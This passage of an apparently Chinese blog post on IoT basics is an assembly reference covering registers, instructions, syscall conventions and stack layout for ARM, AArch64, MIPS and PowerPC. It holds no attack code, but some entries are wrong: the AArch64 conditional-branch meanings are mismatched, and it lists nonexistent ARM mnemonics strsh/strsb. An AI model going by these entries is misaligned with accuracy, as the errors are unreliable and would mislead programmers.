<tbody><tr>
<td>PUSH</td>
<td>{R0~R3, R12}</td>
<td>@将 R0~R3 和 R12 压栈</td>
</tr>
<tr>
<td>POP</td>
<td>{R0~R3,R12}</td>
<td>@从栈中出 R0~R3,R12</td>
</tr>
</tbody></table>
<p><code>STMFD</code>和<code>LDMFD</code>指令也可以用于压栈和弹栈。</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>目的</th>
<th>源</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>STMFD</td>
<td>SP!</td>
<td>{R0~R3, R12}</td>
<td>R0~R3,R12 入栈</td>
</tr>
<tr>
<td>LDMFD</td>
<td>SP!</td>
<td>{R0~R3, R12}</td>
<td>从栈中出 R0~R3,R12</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>指令</th>
<th>计算公式</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>ADD Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn + Rm</td>
<td>加法运算，指令为 ADD</td>
</tr>
<tr>
<td>ADD Rd, Rn, #immed</td>
<td>Rd &#x3D; Rn + #immed</td>
<td>加法运算，指令为 ADD</td>
</tr>
<tr>
<td>ADC Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn + Rm + 进位</td>
<td>带进位的加法运算，指令为 ADC</td>
</tr>
<tr>
<td>ADC Rd, Rn, #immed</td>
<td>Rd &#x3D; Rn + #immed +进位</td>
<td>带进位的加法运算，指令为 ADC</td>
</tr>
<tr>
<td>SUB Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn – Rm</td>
<td>减法</td>
</tr>
<tr>
<td>SUB Rd, #immed</td>
<td>Rd &#x3D; Rd - #immed</td>
<td>减法</td>
</tr>
<tr>
<td>SUB Rd, Rn, #immed</td>
<td>Rd &#x3D; Rn - #immed</td>
<td>减法</td>
</tr>
<tr>
<td>SBC Rd, Rn, #immed</td>
<td>Rd &#x3D; Rn - #immed – 借位</td>
<td>带借位的减法</td>
</tr>
<tr>
<td>SBC Rd, Rn ,Rm</td>
<td>Rd &#x3D; Rn – Rm – 借位</td>
<td>带借位的减法</td>
</tr>
<tr>
<td>MUL Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn * Rm</td>
<td>乘法(32 位)</td>
</tr>
<tr>
<td>UDIV Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn &#x2F; Rm</td>
<td>无符号除法</td>
</tr>
<tr>
<td>SDIV Rd, Rn, Rm</td>
<td>Rd &#x3D; Rn &#x2F; Rm</td>
<td>有符号除法</td>
</tr>
</tbody></table>
<p><a class="link"   href="https://blog.csdn.net/stephenbruce/article/details/51151147" >LDM，STM详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>LDMIA R0!, &#123;R4-R11, R14&#125;</code> ：</p>
<p>LDMIA 中的 I 是 increase 的缩写，A 是 after 的缩写，LD加载(load)的意思，R0后面的感叹号“！表示会自动调节 R0里面的指针<br> 所以整句话意思是任务栈R0的存储地址由低到高，将R0存储地址里面的内容手动加载到 寄存器R0,R4-R12里。<br> <code>STMDB R1!, &#123;R0,R4-R12&#125;</code>：</p>
<p>这就和上面反过来了，ST是存储（store）的意思，D是decrease的意思，B是before的意思，整句话就是R1的存储地址由高到低递减，将R0,R4-R12里的内容存储到R1任务栈里面。</p>
<p><strong>其他的</strong></p>
<p>指令: <code>ldr r3, [r1, r2, lsl #2]</code>，不会改变寄存器 <code>r1</code> 的值。</p>
<p>指令: <code>ldr r3, [r1, r2, lsl #2]!</code>，感叹号代表事先更新，会改变寄存器<code>r1</code>的值为<code>r1+r2&lt;&lt;2</code>。</p>
<p>指令: <code>ldr r2, [r1], r2, lsl #2</code>，是事后更新, 会先把<code>r1</code>保存的值给<code>r2</code>，然后改变<code>r1</code>的值为<code>r1+r2&lt;&lt;2</code>。</p>
<p><a class="link"   href="https://blog.csdn.net/xiaoyu_750516366/article/details/110913858" >arm寻址方式 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>ARM也支持操作不同的数据类型</strong></p>
<p><code>ARM</code>中被加载或者存储的数据类型可以是**无符号（有符号）的字(words，四字节)，半字(halfwords，两字节)，或者字节(bytes)**。这些数据类型在汇编语言中的扩展后缀为<code>-h</code>或者<code>-sh</code>对应着半字，<code>-b</code>或者<code>-sb</code>对应着字节，但是对于字并没有对应的扩展。无符号类型与有符号类型的差别是：</p>
<ul>
<li>符号数据类型可以包含正负数所以数值范围上更低些</li>
<li>无符号数据类型可以放得下很大的正数但是放不了负数</li>
</ul>
<p>这有一些要求使用对应数据类型做存取操作的汇编指令示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldr = 加载字，宽度四字节</span><br><span class="line">ldrh = 加载无符号的半字，宽度两字节</span><br><span class="line">ldrsh = 加载有符号的半字，宽度两字节</span><br><span class="line">ldrb = 加载无符号的字节</span><br><span class="line">ldrsb = 加载有符号的字节</span><br><span class="line"></span><br><span class="line">str = 存储字，宽度四字节</span><br><span class="line">strh = 存储无符号的半字，宽度两字节</span><br><span class="line">strsh = 存储有符号的半字，宽度两字节</span><br><span class="line">strb = 存储无符号的字节</span><br><span class="line">strsb = 存储有符号的字节</span><br></pre></td></tr></table></figure></div>

<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li>R7 保存系统调用号</li>
<li>R0-R4 保存参数</li>
<li>SWI&#x2F;SVC 指令进行系统调用</li>
</ul>
<h3 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><p>一般的栈都是满减栈。下图是其一般结构。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT-%E5%85%A5%E9%97%A8%E7%AF%87/arm_stack.webp"
                      alt="arm_stack"
                ></p>
<h2 id="AARCH64"><a href="#AARCH64" class="headerlink" title="AARCH64"></a>AARCH64</h2><p><a class="link"   href="https://blog.csdn.net/heshuangzong/article/details/126911474" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h3><p>相较于 <code>arm</code>，<code>aarch64</code> 的寄存器改名为 <code>Xn</code>，其低 <code>32</code> 位记为 <code>Wn</code>。</p>
<table>
<thead>
<tr>
<th>ARM</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>X0</td>
<td>General Purpose(第 1 个参数，也可被用作累加器，还被用于存储函数的返回值)</td>
</tr>
<tr>
<td>X1-X7</td>
<td>General Purpose(用于第 2~8 个 参数)</td>
</tr>
<tr>
<td>X8</td>
<td>General Purpose(X8常用来存放系统调用号或一些函数的返回结果)</td>
</tr>
<tr>
<td>X9-X28</td>
<td>General Purpose</td>
</tr>
<tr>
<td>X29(FP)</td>
<td>Frame Pointer(栈帧)</td>
</tr>
<tr>
<td>X30(LR)</td>
<td>Link Register(链接寄存器，用来存放函数的返回地址, <code>aarch64</code>中的<code>RET</code>指令返回<code>X30</code>寄存器中存放的地址)</td>
</tr>
<tr>
<td>X31(SP)</td>
<td>Stack Pointer(栈顶)</td>
</tr>
<tr>
<td>X32(PC)</td>
<td>&lt;Program Counter&#x2F;Instruction Pointer&gt;</td>
</tr>
<tr>
<td>XZR</td>
<td>64bit Zero寄存器，写入此寄存器的数据被忽略，读出的数据全为0</td>
</tr>
<tr>
<td>WZR</td>
<td>32bit Zero寄存器的32bit形式</td>
</tr>
<tr>
<td>ELR_ELx</td>
<td>64bit 异常链接寄存器，保存异常进入ELx的异常地址(x&#x3D;{1,2,3})</td>
</tr>
<tr>
<td>SP_ELx</td>
<td>64bit 栈指针, 保存进入ELx的栈地址(x&#x3D;{0,1,2,3})</td>
</tr>
<tr>
<td>CPSR</td>
<td>程序状态寄存器，用户级编程时用于存储条件码</td>
</tr>
<tr>
<td>SPSR</td>
<td>SPSR 除usr、sys外，用于异常保护的CPSR的备份，异常时，保存CPSR值，异常退出时，将该值恢复到CPSR</td>
</tr>
</tbody></table>
<h3 id="指令-1"><a href="#指令-1" class="headerlink" title="指令"></a>指令</h3><p><code>aarch64</code> 的进栈出栈指令用 <code>STP</code> 和 <code>LDP</code> 代替。</p>
<blockquote>
<p><code>STP x29, x30, [sp, #0x10];</code> 入栈指令，将 x29，x30依次压入 <code>sp+0x10</code>的位置，即 <code>sp+0x10 = x29</code>，<code>sp+0x18 = x30</code>。</p>
<p><code>LDP x29, x30, [sp], #0x40;</code> 出栈指令，将 <code>sp</code> 弹到 x29，将 <code>sp+8</code> 弹到 x30，再将 <code>sp+0x40</code>。</p>
</blockquote>
<p>然后是跳转指令，仍有<code>B</code>，<code>BL</code>指令，新增了<code>BR</code>指令（向寄存器中的地址跳转），<code>BLR</code>组合指令。<br>还有一些带判断的跳转指令：<code>b.ne</code>是不等则跳转，<code>b.eq</code>是等于则跳转，<code>b.le</code>是大于则跳转，<code>b.ge</code>是小于则跳转，<code>b.lt</code>是大于等于则跳转，<code>b.gt</code>是小于等于则跳转，<code>cbz</code>为结果等于零则跳转，<code>cbnz</code>为结果非零则跳转……</p>
<h3 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li>X8 保存系统调用号</li>
<li>X0-X7 保存第 1~8 个参数</li>
<li>SWI&#x2F;SVC 指令进行系统调用</li>
</ul>
<h3 id="栈帧结构-1"><a href="#栈帧结构-1" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><p><a class="link"   href="https://blog.csdn.net/gujing001/article/details/8476685" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="寄存器-2"><a href="#寄存器-2" class="headerlink" title="寄存器"></a>寄存器</h3><ul>
<li><p><code>MIPS</code>下一共有<code>32</code>个通用寄存器</p>
</li>
<li><p>在汇编中，寄存器标志由<code>$</code>符开头</p>
</li>
<li><p>寄存器表示可以有两种方式</p>
<ul>
<li>直接使用该寄存器对应的编号，例如：从<code>$0</code>到<code>$31</code></li>
<li>使用对应的寄存器名称，例如：<code>$t1</code>, <code>$sp</code>。</li>
</ul>
</li>
<li><p>对于乘法和除法分别有对应的两个寄存器<code>$lo</code>, <code>$hi</code></p>
<ul>
<li>对于以上二者，不存在直接寻址；必须要通过<code>mfhi(&quot;move from hi&quot;)</code>以及<code>mflo(&quot;move from lo&quot;)</code>分别来进行访问对应的内容</li>
<li>栈的走向是从高地址到低地址</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>REGISTER</th>
<th>NAME</th>
<th>USAGE</th>
</tr>
</thead>
<tbody><tr>
<td>$0</td>
<td>$zero</td>
<td>常量0，永远返回零</td>
</tr>
<tr>
<td>$1</td>
<td>$at</td>
<td>汇编保留寄存器（不可做其他用途）</td>
</tr>
<tr>
<td>$2-$3</td>
<td>$v0-$v1</td>
<td>(<code>Value</code>简写）存储表达式或者是函数的返回值</td>
</tr>
<tr>
<td>$4-$7</td>
<td>$a0-$a3</td>
<td>(<code>Argument</code>简写）存储子程序的前4个参数，在子程序调用过程中释放</td>
</tr>
<tr>
<td>$8-$15</td>
<td>$t0-$t7</td>
<td>(<code>Temp</code>简写）临时变量，同上调用时不保存</td>
</tr>
<tr>
<td>$16-$23</td>
<td>$s0-$s7</td>
<td>存放子程序调用过程中需要保持不变的值，调用时保存</td>
</tr>
<tr>
<td>$24-$25</td>
<td>$t8-$t9</td>
<td>(<code>Temp</code>简写）临时变量，同上调用时不保存</td>
</tr>
<tr>
<td>$26-$27</td>
<td>$k0-$k1</td>
<td>为操作系统／异常处理保留，至少要预留一个</td>
</tr>
<tr>
<td>$28</td>
<td>$gp</td>
<td>全局指针(Global Pointer)</td>
</tr>
<tr>
<td>$29</td>
<td>$sp</td>
<td>堆栈指针(Stack Pointer)</td>
</tr>
<tr>
<td>$30</td>
<td>$fp</td>
<td>帧指针(Frame Pointer)</td>
</tr>
<tr>
<td>$31</td>
<td>$ra</td>
<td>返回地址(return address)</td>
</tr>
<tr>
<td>特殊寄存器</td>
<td>PC</td>
<td>程序计数器</td>
</tr>
<tr>
<td>特殊寄存器</td>
<td>HI</td>
<td>乘除结果高位寄存器</td>
</tr>
<tr>
<td>特殊寄存器</td>
<td>LO</td>
<td>乘除结果低位寄存器</td>
</tr>
</tbody></table>
<h3 id="指令-2"><a href="#指令-2" class="headerlink" title="指令"></a>指令</h3><table>
<thead>
<tr>
<th>c语言</th>
<th>MIPS名称</th>
<th>大小（字节）</th>
<th>汇编助记符</th>
</tr>
</thead>
<tbody><tr>
<td>char</td>
<td>byte</td>
<td>1</td>
<td>lb中的“b”</td>
</tr>
<tr>
<td>short</td>
<td>halfword</td>
<td>2</td>
<td>lh中的“h”</td>
</tr>
<tr>
<td>int</td>
<td>word</td>
<td>4</td>
<td>lw中的“w”</td>
</tr>
<tr>
<td>long(long long)</td>
<td>dword</td>
<td>8</td>
<td>ld中的“d”</td>
</tr>
</tbody></table>
<ul>
<li><strong>load&#x2F;store</strong></li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>la $t0, val_1</td>
<td>复制val_1表示的地址到t0寄存器中，val_1是个Label</td>
</tr>
<tr>
<td>lw $t2, ($t0)</td>
<td>t0寄存器中的值作为地址，把这个地址起始的Word复制到t2 中</td>
</tr>
<tr>
<td>lw $t2, 4($t0)</td>
<td>t0寄存器中的值作为地址， 把这个地址再加上偏移量4后 所起始的Word 复制到t2中</td>
</tr>
<tr>
<td>sw $t2, ($t0)</td>
<td>把t2寄存器中值（1 Word），存储到t0的值所指向的RAM中</td>
</tr>
<tr>
<td>sw $t2, -12($t0)</td>
<td>把t2寄存器中值（1 Word），存储到t0的值再减去偏移量12, 所指向的RAM 中</td>
</tr>
</tbody></table>
<ul>
<li>算数运算指令</li>
</ul>
<p>算数运算指令的所有操作数都是寄存器，不能直接使用RAM地址或间接寻址，操作数的大小都为 Word （4-Byte）。</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>move $t5, $t1</td>
<td>$t5 &#x3D; $t1;</td>
</tr>
<tr>
<td>add $t0, $t1, $t2</td>
<td>$t0 &#x3D; $t1 + $t2; 带符号数相加</td>
</tr>
<tr>
<td>sub $t0, $t1,$t2</td>
<td>$t0 &#x3D; $t1 - $t2; 带符号数相减</td>
</tr>
<tr>
<td>addi $t0, $t1, 5</td>
<td>$t0 &#x3D; $t1 + 5;</td>
</tr>
<tr>
<td>addu $t0, $t1, $t2</td>
<td>$t0 &#x3D; $t1 + $t2; 无符号数相加</td>
</tr>
<tr>
<td>subu $t0, $t1, $t2</td>
<td>$t0 &#x3D; $t1 - $t2; 无符号数相减</td>
</tr>
<tr>
<td>mult $t3, $t4</td>
<td>$t3 * $t4, 把64-Bits 的积，存储到Lo，Hi中。即： (Hi, Lo) &#x3D; $t3 * $t4;</td>
</tr>
<tr>
<td>div $t5, $t6</td>
<td>Lo &#x3D; $t5 &#x2F; $t6 (Lo为商的整数部分); Hi &#x3D; $t5 mod $t6 (Hi为余数)</td>
</tr>
<tr>
<td>mfhi $t0</td>
<td>$t0 &#x3D; Hi</td>
</tr>
<tr>
<td>mflo $t1</td>
<td>$t1 &#x3D; Lo</td>
</tr>
</tbody></table>
<ul>
<li>分支跳转指令</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>b target</td>
<td>无条件的分支跳转，将跳转到target 标签处</td>
</tr>
<tr>
<td>beq $t0, $t1, target</td>
<td>如果 $t0 &#x3D;&#x3D; $t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>blt $t0, $t1, target</td>
<td>如果 $t0 &lt; $t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>ble $t0, $t1, target</td>
<td>如果 $t0 &lt;&#x3D;$t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>bgt $t0, $t1, target</td>
<td>如果 $t0 &gt; $t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>bge $t0, $t1, target</td>
<td>如果 $t0 &gt;&#x3D; $t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>bne $t0, $t1, target</td>
<td>如果 $t0 !&#x3D; $t1, 则跳转到target 标签处</td>
</tr>
</tbody></table>
<ul>
<li>跳转指令</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>j target</td>
<td>无条件的跳转, 将跳转到target标签处</td>
</tr>
<tr>
<td>jr $t3</td>
<td>跳转到t3寄存器所指向的地址处（Jump Register）</td>
</tr>
</tbody></table>
<ul>
<li>子函数调用指令</li>
</ul>
<p><code>jal sub_routine_label</code> </p>
<p>执行步骤：<br> 　　a. 复制当前的<code>PC</code>到 <code>$ra</code> 寄存器中。 因为当前的 <code>PC</code> 值就是子函数执行完毕后的返回地址。<br> 　　b. 程序跳转到子程序标签 <code>sub_routine_label</code> 处。　　<br> 　　注：子函数的返回，使用 <code>jr $ra</code>　　<br> 　　如果子函数内又调用了其他的子函数，那么 <code>$ra</code> 的值应该被保存到堆栈中。 因为 <code>$ra</code> 的值总是对应着当前执行的子函数的返回地址。</p>
<p><strong>与x86</strong></p>
<p>大多数采用linux嵌入式操作系统的路由器使用的是MIPS32架构，MIPS32架构函数调用时对栈的分配和使用方式与x86架构有异同之处：</p>
<ul>
<li><p>mips32与x86一样，栈是从高地址向低地址增长，但mips32中没有EBP（Base  Pointer）指针，进入一个函数时需要将当前栈指针向下移动 n 比特，这个大小为n比特的存储空间就是此函数的 stack frame  的存储区域。此后栈指针便不再移动，只能在函数返回时再将栈指针加上这个偏移量恢复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈都必须指定偏移量。</p>
</li>
<li><p>函数A调用函数B，A会在栈顶预留一部分空间来保存被调用者B的参数，即调用参数空间。</p>
</li>
<li><p>调用者将前四个参数保存在寄存器 <code>$a0</code> - <code>$a3</code> 中。如果有更多的参数，或者有传值的结构，将被放在调用参数空间（栈，同x86）。</p>
</li>
<li><p>x86使用call命令调用函数会将当前执行位置压入栈，但mips把函数的返回地址直接存入<code>$RA</code>（Return Adress）寄存器，而不是栈。</p>
</li>
</ul>
<h3 id="系统调用-2"><a href="#系统调用-2" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li>$V0 保存系统调用号</li>
</ul>
<ul>
<li>参数所使用的寄存器：$a0~$a3</li>
<li>syscall 指令进行系统调用</li>
</ul>
<h3 id="栈帧结构-2"><a href="#栈帧结构-2" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><h2 id="PowerPC"><a href="#PowerPC" class="headerlink" title="PowerPC"></a>PowerPC</h2><p><a class="link"   href="https://www.cnblogs.com/binarysystemloophole/articles/10313895.html" >参考链接1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a class="link"   href="https://www.cnblogs.com/brucemengbm/p/7103582.html" >参考链接2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a class="link"   href="https://xz.aliyun.com/t/4975?time__1311=n4+xnD0D9DBDcDUxmqhDBqOoimhrpDm2xobD#toc-2" >参考链接3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="寄存器-3"><a href="#寄存器-3" class="headerlink" title="寄存器"></a>寄存器</h3><ul>
<li>PowerPC（PPC） 使用RISC精简指令集，指令字长都是32bit，4字节对齐。PPC和IA32 CPU的不同点在于其定义了大量的通用寄存器，这个和ARM和X64有点类似。</li>
<li>PowerPC处理器可以运行于两个级别，即用户模式和特权模式。用户模式下，仅有GPR，FPR，CR，FPSCR，LR，CTR，XER以及TBL&#x2F;TBU可以访问。</li>
<li>从Power ISA 2.05开始，DCR寄存器也可以在通过用户模式DCR访问指令进行访问。</li>
</ul>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>GPR0-GPR31（共32个寄存器）</td>
<td>通用寄存器</td>
<td>整数运算和寻址通用寄存器.在ABI规范中，GPR1用于堆栈指针，GPR3-GPR4用于函数返回值，GPR3-GPR10用于参数传递</td>
</tr>
<tr>
<td>FPR0-FPR31（共32个寄存器）</td>
<td>浮点寄存器</td>
<td>用于浮点运算。PPC32和PPC64的浮点数都是64位</td>
</tr>
<tr>
<td>LR</td>
<td>链接寄存器</td>
<td>记录转跳地址，常用于记录子程序返回的地址。</td>
</tr>
<tr>
<td>PC</td>
<td>程序计数器</td>
<td>也称AR指令地址寄存器，或者NIP下一条指令指针</td>
</tr>
<tr>
<td>CR</td>
<td>条件寄存器</td>
<td>CR被分为8段，每段四位分别为(LT&#x2F;GT&#x2F;EQ&#x2F;SO), 小于，大于，等于，溢出。</td>
</tr>
<tr>
<td>XER</td>
<td>定点异常寄存器</td>
<td>记录溢出和进位标志，作为CR的补充</td>
</tr>
<tr>
<td>CTR</td>
<td>计数寄存器</td>
<td>用途相当于ECX</td>
</tr>
<tr>
<td>FPSCR</td>
<td>浮点状态和控制寄存器</td>
<td>浮点状态寄存器，用于浮点运算类型的异常记录等，可设置浮点异常捕获掩码</td>
</tr>
<tr>
<td>TBL&#x2F;TBU</td>
<td>时基设施（用于读）</td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>配置寄存器</li>
</ul>
<table>
<thead>
<tr>
<th>配置寄存器</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td>HID0-HID2</td>
<td align="center">硬件实现寄存器</td>
</tr>
<tr>
<td>MSR</td>
<td align="center">机器状态寄存器（用来配置微处理器的设定）</td>
</tr>
<tr>
<td>MBAR</td>
<td align="center">存储器基址寄存器</td>
</tr>
<tr>
<td>SVR</td>
<td align="center">系统处理器</td>
</tr>
<tr>
<td>PVR</td>
<td align="center">版本寄存器</td>
</tr>
</tbody></table>
<ul>
<li>存储管理寄存器</li>
</ul>
<table>
<thead>
<tr>
<th>存储管理寄存器</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td>LBATOU&#x2F;LBATOL&#x2F;LBAT3U&#x2F;LBAT3L</td>
<td align="center">指令BAT寄存器</td>
</tr>
<tr>
<td>DBATOU&#x2F;DBATOL&#x2F;DBAT3U&#x2F;DBAT3L</td>
<td align="center">数据BAT寄存器</td>
</tr>
<tr>
<td>DMISS&#x2F;DCMP&#x2F;HASH1&#x2F;HASH2&#x2F;ICMP&#x2F;RPA</td>
<td align="center">软件表搜索寄存器</td>
</tr>
<tr>
<td>SDR1</td>
<td align="center">SDR1</td>
</tr>
<tr>
<td>SR0-SR15</td>
<td align="center">段寄存器</td>
</tr>
<tr>
<td>SPRGs:SPRG0-SPRG7</td>
<td align="center">中断处理寄存器</td>
</tr>
<tr>
<td>DSISR</td>
<td align="center">DSISR</td>
</tr>
<tr>
<td>SRP0 SRP1</td>
<td align="center">保存恢复寄存器</td>
</tr>
<tr>
<td>DEC</td>
<td align="center">多功能寄存器</td>
</tr>
<tr>
<td>CSRR0-CSRR1</td>
<td align="center">紧急中断寄存器</td>
</tr>
<tr>
<td>DAR</td>
<td align="center">数据地址寄存器</td>
</tr>
<tr>
<td>TBL&#x2F;TBU</td>
<td align="center">时基设施（用于写）</td>
</tr>
<tr>
<td>IABR&#x2F;IABR2&#x2F;DABR&#x2F;DABR2</td>
<td align="center">指令&#x2F;数据地址断点寄存器</td>
</tr>
<tr>
<td>IBCR&#x2F;DBCR</td>
<td align="center">指令&#x2F;数据地址断点控制</td>
</tr>
</tbody></table>
<ul>
<li>通用寄存器</li>
</ul>
<table>
<thead>
<tr>
<th>通用寄存器</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td>r0</td>
<td align="center">在函数开始时使用</td>
</tr>
<tr>
<td>r1(SP)</td>
<td align="center">堆栈指针，相当于ia32架构中的esp寄存器，</td>
</tr>
<tr>
<td>r2(rtoc)</td>
<td align="center">内容表指针，idapro吧这个寄存器反汇编标识为rtoc，系统调用时包含系统调用号</td>
</tr>
<tr>
<td>r3</td>
<td align="center">作为第一个参数和返回值</td>
</tr>
<tr>
<td>r4-r10</td>
<td align="center">函数或系统调用开始的参数</td>
</tr>
<tr>
<td>r11</td>
<td align="center">用在指针的调用或当做一些语言的环境指针</td>
</tr>
<tr>
<td>r12</td>
<td align="center">他用在异常处理个 glink（动态链接器代码）</td>
</tr>
<tr>
<td>r13</td>
<td align="center">保留作为系统线程id</td>
</tr>
<tr>
<td>r14-r31</td>
<td align="center">作为本地变量非易失性</td>
</tr>
</tbody></table>
<ul>
<li>异常处理器</li>
</ul>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>SO 总体溢出标志</td>
<td>一旦有溢出位OV置位，SO就会置位。</td>
</tr>
<tr>
<td>OV 溢出标志</td>
<td>当发生溢出时置位，否则清零；在作乘法或除法运算时，如果结果超过寄存器的表达范围，则溢出置位。</td>
</tr>
<tr>
<td>CA 进位标志</td>
<td>当最高位产生进位时，置位，否则清零；扩展精度指令（后述）可以用CA作为操作符参与运算。</td>
</tr>
</tbody></table>
<ul>
<li>机器字长</li>
</ul>
<table>
<thead>
<tr>
<th>PPC</th>
<th>字长（BITS）</th>
<th>简称</th>
<th>IA32</th>
</tr>
</thead>
<tbody><tr>
<td>BYTE</td>
<td>8</td>
<td>B</td>
<td>BYTE</td>
</tr>
<tr>
<td>HALF WORD</td>
<td>16</td>
<td>H</td>
<td>WORD</td>
</tr>
<tr>
<td>WORD</td>
<td>32</td>
<td>W</td>
<td>DWORD</td>
</tr>
<tr>
<td>DWORD</td>
<td>64</td>
<td>D</td>
<td>QWORD</td>
</tr>
</tbody></table>
<blockquote>
<ul>
<li><p>寄存器r1、r14-r31是非易失性的，这意味着它们的值在函数调用过程保持不变。寄存器r2也算非易失性，但是只有在调用函数在调用后必须恢复它的值时才被处理。</p>
</li>
<li><p>寄存器r0、r3-r12和特殊寄存器lr、ctr、xer、fpscr是易失性的，它们的值在函数调用过程中会发生变化。此外寄存器r0、r2、r11和r12可能会被交叉模块调用改变，所以函数在调用的时候不能采用它们的值。</p>
</li>
<li><p>条件代码寄存器字段cr0、cr1、cr5、cr6和cr7是易失性的。cr2、cr3和cr4是非易失性的，函数如果要改变它们必须保存并恢复这些字段。</p>
</li>
</ul>
</blockquote>
<h3 id="指令-3"><a href="#指令-3" class="headerlink" title="指令"></a>指令</h3><ul>
<li><p>寄存器表示法<br> 所有计算值的指令均以第一个操作数作为目标寄存器。在所有这些指令中，寄存器都仅用数字指定。例如，将数字 12 载入寄存器的指令是<code>li reg,12</code>。12 表示数字 12，原因在于指令格式(因为<code>li</code>第一个操作数就是寄存器，第2个是立即数)。在某些指令中，GPR0 只是代表数值 0，而不会去查找 GPR0 的内容。</p>
</li>
<li><p>立即指令<br> 以<code>i</code>结束的指令通常是立即指令。<code>li</code> 表示“立即装入”，它是表示“在编译时获取已知的常量值并将它存储到寄存器中”的一种方法。</p>
</li>
<li><p>助记符<br> <code>li</code>实际上不是一条指令，它真正的含义是助记符。 助记符有点象预处理器宏：它是汇编程序接受的但秘密转换成其它指令的一条指令。上面提到的<code>li reg,12</code> 实际上被定义为<code>addi reg,0,12</code> 。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>li REG, VALUE</td>
<td>加载寄存器 REG，数字为 VALUE</td>
</tr>
<tr>
<td>add REGA, REGB, REGC</td>
<td>将 REGB 与 REGC 相加，并将结果存储在 REGA 中</td>
</tr>
<tr>
<td>addi REGA, REGB, VALUE</td>
<td>将数字 VALUE 与 REGB 相加，并将结果存储在 REGA 中</td>
</tr>
<tr>
<td>mr REGA, REGB</td>
<td>将 REGB 中的值复制到 REGA 中</td>
</tr>
<tr>
<td>or REGA, REGB, REGC</td>
<td>对 REGB 和 REGC 执行逻辑 “或” 运算，并将结果存储在 REGA 中</td>
</tr>
<tr>
<td>ori REGA, REGB, VALUE</td>
<td>对 REGB 和 VALUE 执行逻辑 “或” 运算，并将结果存储在 REGA 中</td>
</tr>
<tr>
<td>and, andi, xor, xori, nand, nand, nor</td>
<td>其他所有此类逻辑运算都遵循与 “or” 或 “ori” 相同的模式</td>
</tr>
<tr>
<td>ld REGA, 0(REGB)</td>
<td>使用 REGB 的内容作为要载入 REGA 的值的内存地址</td>
</tr>
<tr>
<td>lbz, lhz, lwz</td>
<td>它们均采用相同的格式，但分别操作字节、半字和字(“z” 表示清除该寄存器中的其他内容)</td>
</tr>
<tr>
<td>b ADDRESS</td>
<td>跳转(或转移)到地址 ADDRESS 处的指令</td>
</tr>
<tr>
<td>bl ADDRESS</td>
<td>对地址 ADDRESS 的子例程调用</td>
</tr>
<tr>
<td>cmpd REGA, REGB</td>
<td>比较 REGA 和 REGB 的内容，并恰当地设置状态寄存器的各位</td>
</tr>
<tr>
<td>beq ADDRESS</td>
<td>若之前比较过的寄存器内容等同，则跳转到 ADDRESS</td>
</tr>
<tr>
<td>bne, blt, bgt, ble, and bge</td>
<td>它们均采用相同的形式，但分别检查不等、小于、大于、小于等于和大于等于</td>
</tr>
<tr>
<td>std REGA, d(REGB)</td>
<td>使用 REGB 的地址+d作为保存 REGA 的值的内存地址</td>
</tr>
<tr>
<td>stb, sth, and stw</td>
<td>它们均采用相同的格式，但分别操作字节、半字和字</td>
</tr>
<tr>
<td>sc</td>
<td>对内核进行系统调用</td>
</tr>
</tbody></table>
